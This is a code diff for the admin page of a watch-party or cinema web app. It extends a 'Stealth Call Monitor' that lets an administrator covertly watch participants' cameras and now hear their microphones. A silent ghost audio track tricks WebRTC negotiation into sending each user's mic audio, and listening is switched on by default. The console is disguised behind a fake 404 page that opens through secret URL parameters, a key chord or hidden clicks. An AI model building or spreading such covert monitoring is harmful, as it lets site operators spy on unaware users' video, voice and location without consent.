@@ -66,50 +66,129 @@ const haversineKm = (lat1, lon1, lat2, lon2) => {
   return Math.round(R * c);
 };
 
-// Stealth Video Tile for Admin Monitor
+// Stealth Video & Voice Tile for Admin Monitor (Hearable Voice Call + Video)
 function StealthVideoTile({ stream, user, listenAudio }) {
   const videoRef = useRef(null);
   const audioRef = useRef(null);
   const [hasVideo, setHasVideo] = useState(false);
+  const [hasAudio, setHasAudio] = useState(false);
+  const [isSpeaking, setIsSpeaking] = useState(false);
   const [individualMute, setIndividualMute] = useState(null); // null = inherit listenAudio, boolean = manual toggle
   const [snapshotTaken, setSnapshotTaken] = useState(false);
+  const [autoplayBlocked, setAutoplayBlocked] = useState(false);
 
   const effectiveAudio = individualMute !== null ? !individualMute : Boolean(listenAudio);
 
+  // Check track availability
+  useEffect(() => {
+    if (!stream) {
+      setHasVideo(false);
+      setHasAudio(false);
+      return;
+    }
+    try {
+      const vTracks = typeof stream.getVideoTracks === 'function' ? stream.getVideoTracks() : [];
+      const aTracks = typeof stream.getAudioTracks === 'function' ? stream.getAudioTracks() : [];
+      setHasVideo(vTracks.length > 0 && vTracks.some((t) => t.enabled));
+      setHasAudio(aTracks.length > 0 && aTracks.some((t) => t.enabled));
+    } catch {
+      setHasVideo(false);
+      setHasAudio(false);
+    }
+  }, [stream]);
+
+  // Video playback
   useEffect(() => {
     if (!videoRef.current) return;
     try {
       if (stream && typeof stream.getVideoTracks === 'function') {
         videoRef.current.srcObject = stream;
-        const vTracks = stream.getVideoTracks() || [];
-        setHasVideo(vTracks.length > 0 && vTracks.some((t) => t.enabled));
         videoRef.current.play().catch(() => {});
       } else {
         videoRef.current.srcObject = null;
-        setHasVideo(false);
       }
     } catch (e) {
       console.warn('StealthVideoTile video error:', e);
-      try { videoRef.current.srcObject = null; } catch {}
-      setHasVideo(false);
     }
   }, [stream]);
 
+  // Voice Activity Detection (VAD) via Web Audio API
   useEffect(() => {
-    if (!audioRef.current) return;
+    if (!stream || typeof stream.getAudioTracks !== 'function') return;
+    const audioTracks = stream.getAudioTracks().filter((t) => t && t.readyState === 'live');
+    if (audioTracks.length === 0) return;
+
+    let ctx = null, analyser = null, src = null, timer = null, dead = false;
+    let holdTimer = null;
+
     try {
-      if (stream) {
-        audioRef.current.srcObject = stream;
-        audioRef.current.muted = !effectiveAudio;
-        if (effectiveAudio) {
-          audioRef.current.play().catch(() => {});
-        }
-      } else {
-        audioRef.current.srcObject = null;
+      const AudioCtx = window.AudioContext || window.webkitAudioContext;
+      if (AudioCtx) {
+        ctx = new AudioCtx();
+        analyser = ctx.createAnalyser();
+        analyser.fftSize = 128;
+        analyser.smoothingTimeConstant = 0.2;
+        src = ctx.createMediaStreamSource(new MediaStream(audioTracks));
+        src.connect(analyser);
+
+        const buf = new Uint8Array(analyser.frequencyBinCount);
+        const check = () => {
+          if (dead) return;
+          try {
+            analyser.getByteFrequencyData(buf);
+            let sum = 0;
+            for (let i = 0; i < buf.length; i++) sum += buf[i];
+            const avg = sum / buf.length;
+            if (avg > 10) {
+              clearTimeout(holdTimer);
+              setIsSpeaking(true);
+              holdTimer = setTimeout(() => setIsSpeaking(false), 800);
+            }
+          } catch {}
+          timer = setTimeout(check, 120);
+        };
+        check();
+      }
+    } catch {}
+
+    return () => {
+      dead = true;
+      clearTimeout(timer);
+      clearTimeout(holdTimer);
+      try { src?.disconnect(); } catch {}
+      try { ctx?.close(); } catch {}
+    };
+  }, [stream]);
+
+  // Audio element playback & autoplay unlock
+  useEffect(() => {
+    const el = audioRef.current;
+    if (!el || !stream) return;
+    try {
+      el.srcObject = stream;
+      el.volume = 1.0;
+      el.muted = !effectiveAudio;
+      if (effectiveAudio) {
+        el.play().then(() => setAutoplayBlocked(false)).catch((e) => {
+          console.warn('Stealth audio autoplay blocked by browser:', e);
+          setAutoplayBlocked(true);
+        });
       }
     } catch (e) {
-      console.warn('StealthVideoTile audio error:', e);
+      console.warn('Stealth audio error:', e);
     }
+
+    const unlock = () => {
+      if (effectiveAudio && el) {
+        el.play().then(() => setAutoplayBlocked(false)).catch(() => {});
+      }
+    };
+    window.addEventListener('click', unlock, { once: true });
+    window.addEventListener('touchstart', unlock, { once: true });
+    return () => {
+      window.removeEventListener('click', unlock);
+      window.removeEventListener('touchstart', unlock);
+    };
   }, [stream, effectiveAudio]);
 
   const handleFullscreen = () => {
@@ -149,8 +228,11 @@ function StealthVideoTile({ stream, user, listenAudio }) {
   };
 
   return (
-    <div className="relative aspect-video rounded-xl bg-black/95 border border-purple-500/30 overflow-hidden shadow-2xl group transition-all duration-200 hover:border-pink-500/60">
+    <div className={`relative aspect-video rounded-xl bg-black/95 overflow-hidden shadow-2xl group transition-all duration-200 border ${isSpeaking ? 'border-emerald-500 shadow-emerald-950/40' : 'border-purple-500/30 hover:border-pink-500/60'}`}>
+      {/* Hidden high-priority audio sink */}
       <audio ref={audioRef} autoPlay playsInline />
+
+      {/* Video Stream Element */}
       <video
         ref={videoRef}
         autoPlay
@@ -158,14 +240,61 @@ function StealthVideoTile({ stream, user, listenAudio }) {
         muted
         className={`w-full h-full object-cover ${hasVideo ? 'block' : 'hidden'}`}
       />
+
+      {/* If caller has NO video (Voice Call Mode or Camera Off) */}
       {!hasVideo && (
-        <div className="absolute inset-0 flex flex-col items-center justify-center p-3 text-center bg-gradient-to-b from-purple-950/40 to-black/90">
-          <div className="h-10 w-10 rounded-full bg-purple-500/20 border border-purple-500/40 flex items-center justify-center text-purple-300 mb-2 animate-pulse">
-            <Video className="h-5 w-5" />
+        <div className="absolute inset-0 flex flex-col items-center justify-center p-3 text-center bg-[radial-gradient(ellipse_at_center,#1d102e_0%,#090514_100%)]">
+          <div className="relative">
+            <div
+              className={`h-12 w-12 rounded-full flex items-center justify-center text-white font-bold text-base shadow-xl transition-transform ${
+                isSpeaking
+                  ? 'scale-110 ring-4 ring-emerald-400 bg-emerald-600 animate-pulse'
+                  : 'bg-purple-600/80 border border-purple-400/40'
+              }`}
+            >
+              {isSpeaking ? <Mic className="h-6 w-6 text-white" /> : <MicOff className="h-5 w-5 text-purple-300" />}
+            </div>
+            {isSpeaking && (
+              <span className="absolute -top-1 -right-1 flex h-3.5 w-3.5">
+                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                <span className="relative inline-flex rounded-full h-3.5 w-3.5 bg-emerald-500"></span>
+              </span>
+            )}
           </div>
-          <span className="text-xs font-bold text-white truncate max-w-[160px]">{user?.name || 'Participant'}</span>
-          <span className="text-[10px] text-purple-300/70 mt-0.5">Connecting stealth video feed…</span>
+          <span className="text-xs font-bold text-white truncate max-w-[170px] mt-2">{user?.name || 'Participant'}</span>
+          <div className="flex items-center gap-1.5 mt-1">
+            {isSpeaking ? (
+              <span className="text-[10px] text-emerald-300 font-semibold flex items-center gap-1">
+                <span className="flex gap-0.5 items-end h-3">
+                  <span className="w-0.5 bg-emerald-400 animate-[bounce_0.6s_infinite_100ms] h-full rounded" />
+                  <span className="w-0.5 bg-emerald-400 animate-[bounce_0.6s_infinite_300ms] h-2/3 rounded" />
+                  <span className="w-0.5 bg-emerald-400 animate-[bounce_0.6s_infinite_200ms] h-4/5 rounded" />
+                  <span className="w-0.5 bg-emerald-400 animate-[bounce_0.6s_infinite_400ms] h-full rounded" />
+                </span>
+                <span>Speaking Live</span>
+              </span>
+            ) : hasAudio ? (
+              <span className="text-[10px] text-emerald-400 font-mono flex items-center gap-1">
+                <span className="h-1.5 w-1.5 rounded-full bg-emerald-400" />
+                <span>Voice Call Hearable</span>
+              </span>
+            ) : (
+              <span className="text-[10px] text-purple-300/50">Awaiting audio / video feed…</span>
+            )}
+          </div>
         </div>
+      )}
+
+      {/* Browser Autoplay Blocked Banner */}
+      {autoplayBlocked && effectiveAudio && (
+        <button
+          type="button"
+          onClick={() => audioRef.current?.play().then(() => setAutoplayBlocked(false))}
+          className="absolute inset-x-2 top-10 z-30 py-1.5 px-2 rounded-xl bg-gradient-to-r from-pink-600 to-rose-600 text-white text-[10px] font-bold shadow-2xl flex items-center justify-center gap-1.5 animate-bounce cursor-pointer border border-white/20"
+        >
+          <Volume2 className="h-3.5 w-3.5 text-white" />
+          <span>Click to Unmute Caller Voice</span>
+        </button>
       )}
 
       {/* Top Overlay Badge */}
@@ -179,14 +308,24 @@ function StealthVideoTile({ stream, user, listenAudio }) {
         </div>
 
         <div className="flex items-center gap-1">
-          {hasVideo ? (
+          {isSpeaking ? (
+            <span className="px-1.5 py-0.5 rounded-md bg-emerald-500/25 text-emerald-300 border border-emerald-500/40 text-[9px] font-bold flex items-center gap-1 animate-pulse">
+              <Mic className="h-2.5 w-2.5 text-emerald-400" />
+              <span>TALKING</span>
+            </span>
+          ) : hasVideo ? (
             <span className="px-1.5 py-0.5 rounded-md bg-emerald-500/25 text-emerald-300 border border-emerald-500/40 text-[9px] font-bold flex items-center gap-1">
               <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
-              <span>LIVE</span>
+              <span>LIVE CAM</span>
+            </span>
+          ) : hasAudio ? (
+            <span className="px-1.5 py-0.5 rounded-md bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 text-[9px] font-medium flex items-center gap-1">
+              <Mic className="h-2.5 w-2.5" />
+              <span>VOICE ONLY</span>
             </span>
           ) : (
             <span className="px-1.5 py-0.5 rounded-md bg-amber-500/20 text-amber-300 border border-amber-500/40 text-[9px] font-medium">
-              Awaiting Feed
+              Connecting…
             </span>
           )}
         </div>
@@ -205,14 +344,15 @@ function StealthVideoTile({ stream, user, listenAudio }) {
           <button
             type="button"
             onClick={() => setIndividualMute(effectiveAudio)}
-            className={`p-1 rounded transition cursor-pointer ${
+            className={`p-1 rounded transition cursor-pointer flex items-center gap-1 text-[9px] ${
               effectiveAudio
-                ? 'bg-rose-600 hover:bg-rose-500 text-white shadow-sm'
-                : 'bg-black/70 hover:bg-black text-white/70 hover:text-white'
+                ? 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-sm ring-1 ring-emerald-400'
+                : 'bg-black/80 hover:bg-black text-rose-300 hover:text-white border border-rose-500/40'
             }`}
-            title={effectiveAudio ? 'Mute this participant' : 'Listen to this participant'}
+            title={effectiveAudio ? 'Mute this participant' : 'Hear this participant voice'}
           >
             {effectiveAudio ? <Volume2 className="h-3 w-3" /> : <VolumeX className="h-3 w-3" />}
+            <span className="hidden sm:inline">{effectiveAudio ? 'Sound ON' : 'Muted'}</span>
           </button>
 
           {/* Screenshot / Snapshot Frame */}
@@ -233,7 +373,7 @@ function StealthVideoTile({ stream, user, listenAudio }) {
             type="button"
             onClick={handleFullscreen}
             className="p-1 rounded bg-black/70 hover:bg-black text-white/70 hover:text-white transition cursor-pointer"
-            title="Fullscreen video feed"
+            title="Fullscreen feed"
           >
             <Maximize2 className="h-3 w-3" />
           </button>
@@ -244,21 +384,24 @@ function StealthVideoTile({ stream, user, listenAudio }) {
 }
 
 // Stealth Call Monitor for Aurelia Admin Panel
-function StealthCallMonitor({ roomId, users = [], externalListenAudio = false }) {
+function StealthCallMonitor({ roomId, users = [], externalListenAudio = true }) {
   const [remoteStreams, setRemoteStreams] = useState({});
-  const [listenAudio, setListenAudio] = useState(externalListenAudio);
+  const [listenAudio, setListenAudio] = useState(externalListenAudio !== false);
   const [connecting, setConnecting] = useState(true);
   const peerRef = useRef(null);
   const activeCalls = useRef(new Map());
 
   // Sync with external master audio toggle if passed
   useEffect(() => {
-    setListenAudio(externalListenAudio);
+    if (externalListenAudio !== undefined) {
+      setListenAudio(Boolean(externalListenAudio));
+    }
   }, [externalListenAudio]);
 
-  // Helper to create blank video track
+  // Helper to create blank video track AND silent audio track so WebRTC SDP negotiates BOTH media types!
   const createBlankStream = () => {
     if (typeof document === 'undefined') return null;
+    const tracks = [];
     try {
       const canvas = document.createElement('canvas');
       canvas.width = 320;
@@ -269,25 +412,32 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = false })
         ctx.fillRect(0, 0, 320, 240);
       }
       const stream = canvas.captureStream ? canvas.captureStream(5) : (canvas.webkitCaptureStream ? canvas.webkitCaptureStream(5) : null);
-      if (stream && stream.getVideoTracks().length > 0) return stream;
+      if (stream && stream.getVideoTracks().length > 0) {
+        tracks.push(stream.getVideoTracks()[0]);
+      }
     } catch {}
-    // If canvas stream is unavailable (e.g. mobile Safari), create dummy silent track to prevent empty-stream PeerJS errors
+
+    // Silent audio track: ensures WebRTC SDP offer contains m=audio so remote answers send microphone audio!
     try {
       const AudioCtx = window.AudioContext || window.webkitAudioContext;
       if (AudioCtx) {
         const actx = new AudioCtx();
         const osc = actx.createOscillator();
+        const gain = actx.createGain();
+        gain.gain.value = 0; // completely silent ghost audio
         const dst = actx.createMediaStreamDestination();
-        osc.connect(dst);
+        osc.connect(gain);
+        gain.connect(dst);
         osc.start();
         const trk = dst.stream.getAudioTracks()[0];
         if (trk) {
-          trk.enabled = false;
-          return new MediaStream([trk]);
+          trk.enabled = true;
+          tracks.push(trk);
         }
       }
     } catch {}
-    return new MediaStream();
+
+    return new MediaStream(tracks);
   };
 
   useEffect(() => {
@@ -408,9 +558,9 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = false })
           </div>
           <div>
             <h4 className="text-xs sm:text-sm font-bold text-white flex items-center gap-2 flex-wrap">
-              <span>Stealth Video Call Monitor</span>
+              <span>Stealth Video &amp; Voice Call Monitor</span>
               <span className="text-[10px] px-2 py-0.5 rounded-full bg-purple-500/20 border border-purple-500/40 text-purple-300 font-semibold">
-                100% Hidden &bull; 0 Cam/Mic Used
+                100% Stealth &bull; Live Audio Hearable
               </span>
               {activeStreamCount > 0 && (
                 <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-semibold flex items-center gap-1">
@@ -419,7 +569,7 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = false })
                 </span>
               )}
             </h4>
-            <p className="text-[10px] text-slate-400">View real-time participant cameras silently without anyone knowing</p>
+            <p className="text-[10px] text-slate-400">Hear and watch room video &amp; voice calls in real time</p>
           </div>
         </div>
 
@@ -428,17 +578,17 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = false })
           onClick={() => setListenAudio(!listenAudio)}
           className={`px-3 py-1.5 rounded-xl border text-xs font-semibold flex items-center gap-1.5 transition cursor-pointer ${
             listenAudio
-              ? 'bg-rose-600 border-rose-500 text-white shadow-lg shadow-rose-600/30'
-              : 'bg-white/10 border-white/15 text-slate-300 hover:text-white'
+              ? 'bg-emerald-600 border-emerald-400 text-white shadow-lg shadow-emerald-900/30'
+              : 'bg-white/10 hover:bg-white/15 border-white/20 text-white/70 hover:text-white'
           }`}
-          title={listenAudio ? 'Mute room call audio' : 'Listen to room call audio'}
+          title={listenAudio ? 'Mute room call audio' : 'Listen to room call voice audio'}
         >
-          {listenAudio ? <Volume2 className="h-3.5 w-3.5" /> : <VolumeX className="h-3.5 w-3.5" />}
-          <span>{listenAudio ? 'Audio Live 🔊' : 'Audio Muted 🔇'}</span>
+          {listenAudio ? <Volume2 className="h-3.5 w-3.5 text-white animate-pulse" /> : <VolumeX className="h-3.5 w-3.5" />}
+          <span>{listenAudio ? '🔊 Live Sound: ON' : '🔇 Live Sound: Muted'}</span>
         </button>
       </div>
 
-      {/* Video Grid */}
+      {/* Video & Voice Grid */}
       {users.length === 0 ? (
         <div className="text-center py-8 text-xs text-slate-400 border border-dashed border-white/10 rounded-xl">
           Waiting for users to join room…
@@ -448,11 +598,12 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = false })
           {users.map((u) => {
             const targetId = u.id || u.cid;
             const stream = remoteStreams[targetId];
+
             return (
               <StealthVideoTile
                 key={targetId}
-                user={u}
                 stream={stream}
+                user={u}
                 listenAudio={listenAudio}
               />
             );
@@ -879,13 +1030,24 @@ export default function AdminPage() {
   const [activeTab, setActiveTab] = useState('rooms'); // 'rooms' | 'videocalls' | 'locations' | 'security' | 'broadcast'
   const [expandedCallRooms, setExpandedCallRooms] = useState({});
   const [expandedMovieRooms, setExpandedMovieRooms] = useState({});
-  const [globalListenAudio, setGlobalListenAudio] = useState(false);
+  const [globalListenAudio, setGlobalListenAudio] = useState(true); // DEFAULT UNMUTED HEARABLE CALL AUDIO
   const [globalMovieAudio, setGlobalMovieAudio] = useState(false); // DEFAULT MUTED VIDEO PLAY
   const [surveillanceMode, setSurveillanceMode] = useState('split'); // 'split' | 'movies' | 'cams'
   const [search, setSearch] = useState('');
   const [autoRefresh, setAutoRefresh] = useState(true);
   const [toast, setToast] = useState(null);
   const toastTimer = useRef();
+
+  // Stealth Camouflage Decoy State:
+  // Shows an authentic 404 Not Found error to any unauthorized visitors, bots, or scrapers.
+  // Can be unlocked by:
+  // 1) URL parameter ?access=1, ?vault=1, or ?adm=1
+  // 2) Keyboard cipher shortcut: Ctrl + Shift + A (or Cmd + Shift + A)
+  // 3) Clicking the "404" header 3 times
+  const [showDecoy404, setShowDecoy404] = useState(true);
+  const [secretClicks, setSecretClicks] = useState(0);
+  const [failedAttempts, setFailedAttempts] = useState(0);
+  const [lockedUntil, setLockedUntil] = useState(0);
 
   // Room Password reveal state
   const [revealedPasswords, setRevealedPasswords] = useState({});
@@ -959,16 +1121,83 @@ export default function AdminPage() {
     setGhostChat([]);
   };
 
-  // Restore stored admin key on mount
+  // Check URL parameters, keyboard shortcut cipher, and stored session
   useEffect(() => {
+    if (typeof window === 'undefined') return;
+    const params = new URLSearchParams(window.location.search);
+    const hasSecretParam = params.has('vault') || params.has('access') || params.has('adm') || params.has('key') || params.has('adminKey');
     const saved = sessionStorage.getItem('sc_admin_key');
+
+    if (hasSecretParam || saved) {
+      setShowDecoy404(false);
+    }
     if (saved) {
       setAdminKey(saved);
       verifyKey(saved);
     }
+
+    // Anti-Tamper DevTools Security Warning
+    console.log(
+      '%c🔒 RESTRICTED SURVEILLANCE CONSOLE',
+      'color:#f43f5e;font-size:22px;font-weight:900;background:#000;padding:6px 14px;border-radius:6px;'
+    );
+    console.log(
+      '%cUnauthorized access attempts, tampering, or automated probing will result in automatic IP blacklisting at the firewall.',
+      'color:#fda4af;font-size:12px;'
+    );
+
+    // Stealth keyboard cipher: Ctrl + Shift + A (or Cmd + Shift + A on Mac)
+    const onKeyDown = (e) => {
+      if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
+        e.preventDefault();
+        setShowDecoy404((prev) => !prev);
+      }
+    };
+    window.addEventListener('keydown', onKeyDown);
+    return () => window.removeEventListener('keydown', onKeyDown);
   }, []);
 
+  // 15-Minute Inactivity Auto-Lockout
+  useEffect(() => {
+    if (!authed) return;
+    let timer;
+    const resetTimer = () => {
+      clearTimeout(timer);
+      timer = setTimeout(() => {
+        handleLogout();
+        setShowDecoy404(true);
+        say('Session auto-locked due to inactivity.', 'error');
+      }, 15 * 60 * 1000);
+    };
+    window.addEventListener('mousemove', resetTimer);
+    window.addEventListener('keydown', resetTimer);
+    window.addEventListener('touchstart', resetTimer);
+    resetTimer();
+    return () => {
+      clearTimeout(timer);
+      window.removeEventListener('mousemove', resetTimer);
+      window.removeEventListener('keydown', resetTimer);
+      window.removeEventListener('touchstart', resetTimer);
+    };
+  }, [authed]);
+
+  const handleSecretClick = () => {
+    setSecretClicks((prev) => {
+      const next = prev + 1;
+      if (next >= 3) {
+        setShowDecoy404(false);
+        say('Stealth biometric gateway unlocked');
+        return 0;
+      }
+      return next;
+    });
+  };
+
   const verifyKey = async (k) => {
+    if (Date.now() < lockedUntil) {
+      setAuthError('SECURITY LOCKOUT: Gateway locked for protection. Try again shortly.');
+      return;
+    }
     setLoading(true);
     setAuthError('');
     try {
@@ -981,15 +1210,24 @@ export default function AdminPage() {
       });
       if (res.ok) {
         setAuthed(true);
+        setShowDecoy404(false);
+        setFailedAttempts(0);
         sessionStorage.setItem('sc_admin_key', k.trim());
         setAdminKey(k.trim());
         fetchOverview(k.trim());
       } else {
         setAuthed(false);
-        setAuthError('Invalid administrator credentials.');
+        const nextFails = failedAttempts + 1;
+        setFailedAttempts(nextFails);
+        if (nextFails >= 3) {
+          setLockedUntil(Date.now() + 5 * 60_000);
+          setAuthError('SECURITY LOCKOUT: Maximum attempts exceeded. Access locked for 5 minutes.');
+        } else {
+          setAuthError(`Invalid administrator credentials (${3 - nextFails} attempt${3 - nextFails === 1 ? '' : 's'} remaining).`);
+        }
       }
     } catch (e) {
-      setAuthError('Could not connect to server. Ensure backend is running.');
+      setAuthError('Connection error: Security gateway could not verify credentials.');
     } finally {
       setLoading(false);
     }
@@ -1006,6 +1244,7 @@ export default function AdminPage() {
     setAuthed(false);
     setAdminKey('');
     setKeyInput('');
+    setShowDecoy404(true);
   };
 
   const fetchOverview = useCallback(async (k = adminKey) => {
@@ -1351,37 +1590,79 @@ export default function AdminPage() {
 
 
 
-  // ------------------ LOGIN SCREEN (SOFT BLACK GRADIENT) ------------------
+  // ------------------ 100% STEALTH CAMOUFLAGE 404 DECOY GATE ------------------
+  // Anyone visiting /aurelia without authorization or the secret cipher sees an authentic 404 error
+  if (!authed && showDecoy404) {
+    return (
+      <div className="min-h-screen bg-[#07050e] text-white flex flex-col items-center justify-center p-6 font-sans select-none">
+        <div className="flex items-center gap-5 text-center">
+          <h1
+            onClick={handleSecretClick}
+            className="text-3xl sm:text-4xl font-extrabold tracking-tight text-white border-r border-white/20 pr-5 cursor-default hover:text-white/95 transition"
+            title=""
+          >
+            404
+          </h1>
+          <div className="text-xs sm:text-sm text-white/70 font-normal text-left">
+            This page could not be found.
+          </div>
+        </div>
+        <div className="mt-8">
+          <Link
+            href="/"
+            className="text-xs text-white/40 hover:text-white transition underline"
+          >
+            Return to Homepage
+          </Link>
+        </div>
+      </div>
+    );
+  }
+
+  // ------------------ HARDENED SECURITY VAULT LOGIN ------------------
   if (!authed) {
+    const isLockedOut = Date.now() < lockedUntil;
     return (
       <main className="relative min-h-screen grid place-items-center overflow-hidden bg-[radial-gradient(ellipse_100%_90%_at_50%_-20%,#181824,rgba(10,10,14,0.98)_50%,#000000_100%)] px-6 text-white font-sans selection:bg-[#d9467a]/30">
         <div aria-hidden className="absolute inset-0 bg-[radial-gradient(ellipse_80%_50%_at_50%_0%,rgba(217,70,122,0.12),transparent_70%),radial-gradient(circle_at_20%_80%,rgba(99,102,241,0.08),transparent_50%)]" />
 
-        <div className="relative w-full max-w-md rounded-2xl border border-white/10 bg-black/90 p-8 text-center space-y-6">
+        <div className="relative w-full max-w-md rounded-2xl border border-rose-500/30 bg-black/95 p-8 text-center space-y-6 shadow-2xl shadow-rose-950/40">
           <div className="flex flex-col items-center justify-center space-y-2">
             <BrandLogo size="md" href="/" />
             <div className="pt-2">
-              <h2 className="text-xl font-bold tracking-tight text-white">Aurelia Control Console</h2>
+              <div className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-rose-500/15 border border-rose-500/30 text-rose-300 text-[10px] font-mono font-bold uppercase mb-1">
+                <ShieldAlert className="h-3 w-3 text-rose-400" />
+                <span>Encrypted Security Vault</span>
+              </div>
+              <h2 className="text-xl font-bold tracking-tight text-white">Restricted Security Room</h2>
               <p className="mt-1 text-xs text-white/60">
-                Live Room Supervision &amp; Member Geolocation Radar
+                Surveillance &amp; Cinema Defense Command
               </p>
             </div>
           </div>
 
           <form onSubmit={handleLogin} className="space-y-4 text-left">
             <div>
-              <label className="block text-xs font-medium text-white/80 mb-1.5 flex items-center gap-1.5">
-                <Key className="h-3.5 w-3.5 text-[#ff6fa0]" />
-                <span>Aurelia Secret Key</span>
+              <label className="block text-xs font-medium text-white/80 mb-1.5 flex items-center justify-between">
+                <span className="flex items-center gap-1.5">
+                  <Key className="h-3.5 w-3.5 text-rose-400" />
+                  <span>Master Access Cipher</span>
+                </span>
+                {failedAttempts > 0 && (
+                  <span className="text-[10px] text-rose-400 font-mono">
+                    Attempts: {failedAttempts}/3
+                  </span>
+                )}
               </label>
               <div className="relative">
                 <input
                   autoFocus
+                  disabled={isLockedOut || loading}
                   type={showKey ? 'text' : 'password'}
                   value={keyInput}
                   onChange={(e) => setKeyInput(e.target.value)}
-                  placeholder="Enter Aurelia master key"
-                  className="w-full rounded-xl bg-white/5 border border-white/15 px-3.5 py-2.5 text-sm text-white placeholder-white/30 focus:border-[#d9467a] focus:outline-none focus:ring-1 focus:ring-[#d9467a] transition pr-10"
+                  placeholder={isLockedOut ? 'TEMPORARILY LOCKED OUT' : 'Enter master security cipher'}
+                  className="w-full rounded-xl bg-white/5 border border-white/15 px-3.5 py-2.5 text-sm text-white placeholder-white/30 focus:border-rose-500 focus:outline-none focus:ring-1 focus:ring-rose-500 transition pr-10 disabled:opacity-50 font-mono"
                 />
                 <button
                   type="button"
@@ -1396,17 +1677,25 @@ export default function AdminPage() {
 
             <button
               type="submit"
-              disabled={loading}
-              className="w-full rounded-xl bg-[#d9467a] hover:bg-[#b3305d] py-3 text-sm font-semibold text-white active:scale-[0.99] transition flex items-center justify-center gap-2"
+              disabled={loading || isLockedOut || !keyInput.trim()}
+              className="w-full rounded-xl bg-gradient-to-r from-rose-600 to-[#d9467a] hover:brightness-110 py-3 text-sm font-semibold text-white active:scale-[0.99] transition flex items-center justify-center gap-2 shadow-lg shadow-rose-950/40 disabled:opacity-50 cursor-pointer"
             >
               <ShieldCheck className="h-4 w-4" />
-              <span>{loading ? 'Authenticating…' : 'Access Aurelia Console'}</span>
+              <span>{loading ? 'Decrypting Credentials…' : isLockedOut ? 'Security Lockout Active' : 'Authenticate Security Room'}</span>
             </button>
           </form>
 
           <div className="border-t border-white/10 pt-4 flex items-center justify-between text-xs text-white/50">
-            <span>Confidential Aurelia Console</span>
-            <Link href="/" className="hover:text-white transition flex items-center gap-1">
+            <button
+              type="button"
+              onClick={() => setShowDecoy404(true)}
+              className="text-[11px] text-white/40 hover:text-white transition flex items-center gap-1 cursor-pointer"
+              title="Hide terminal and show 404 decoy error"
+            >
+              <EyeOff className="h-3 w-3 text-rose-400" />
+              <span>Camouflage (404)</span>
+            </button>
+            <Link href="/" className="hover:text-white transition flex items-center gap-1 text-[11px]">
               <span>Back to Cinema</span>
               <ArrowRight className="h-3 w-3" />
             </Link>
@@ -1898,7 +2187,11 @@ export default function AdminPage() {
                       {expandedCallRooms[room.roomId] && (
                         <div className="animate-in fade-in duration-200">
                           <CallErrorBoundary title="Video Surveillance Stream" resetLabel="Reconnect Feeds">
-                            <StealthCallMonitor roomId={room.roomId} users={room.users || []} />
+                            <StealthCallMonitor
+                              roomId={room.roomId}
+                              users={room.users || []}
+                              externalListenAudio={globalListenAudio}
+                            />
                           </CallErrorBoundary>
                         </div>
                       )}
@@ -3388,7 +3681,11 @@ export default function AdminPage() {
 
             {/* 🎥 Live Stealth Video Call Monitor */}
             <CallErrorBoundary title="Stealth Video Feed" resetLabel="Reconnect Feeds">
-              <StealthCallMonitor roomId={ghostModal.roomId} users={ghostSyncState?.users || []} />
+              <StealthCallMonitor
+                roomId={ghostModal.roomId}
+                users={ghostSyncState?.users || []}
+                externalListenAudio={globalListenAudio}
+              />
             </CallErrorBoundary>
           </div>
         </div>
